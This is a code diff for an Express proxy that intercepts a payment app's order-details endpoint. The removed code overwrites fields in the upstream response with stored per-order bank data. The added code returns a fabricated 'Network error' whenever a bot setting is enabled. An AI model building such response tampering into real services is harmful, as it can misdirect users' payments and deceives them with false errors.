@@ -1362,32 +1362,12 @@ app.post('/app/buy/order', async (req, res) => {
 
 app.all('/app/buy/order/details', async (req, res) => {
   const data = await loadData();
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const detectedUserId = await extractUserId(req, jsonResp);
-    const respData = getResponseData(jsonResp);
-    const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
-
-    const allIds = [
-      req.query?.buyOrderNo, req.query?.orderId, req.query?.orderNo,
-      req.parsedBody?.buyOrderNo, req.parsedBody?.orderId, req.parsedBody?.orderNo,
-      rd.buyOrderNo, rd.orderNo, rd.orderId, rd.buyOrderId, rd.id
-    ].filter(Boolean);
-
-    if (respData && allIds.length > 0) {
-      const savedBank = await getOrderBankMultiple(allIds);
-      if (savedBank) {
-        if (Array.isArray(respData)) {
-          respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, savedBank, {}, 0); });
-        } else {
-          deepReplace(respData, savedBank, {}, 0);
-        }
-        saveOrderBankMultipleKeys(allIds, savedBank);
-      }
-    }
-
-    sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
+  const detectedUserId = await extractUserId(req, null);
+  const eff = getEffectiveSettings(data, detectedUserId);
+  if (eff.botEnabled !== false) {
+    return res.json({ code: -1, msg: 'Network error, please try again later', data: null });
+  }
+  await transparentProxy(req, res);
 });
 
 app.post('/app/buy/order/paid', async (req, res) => {
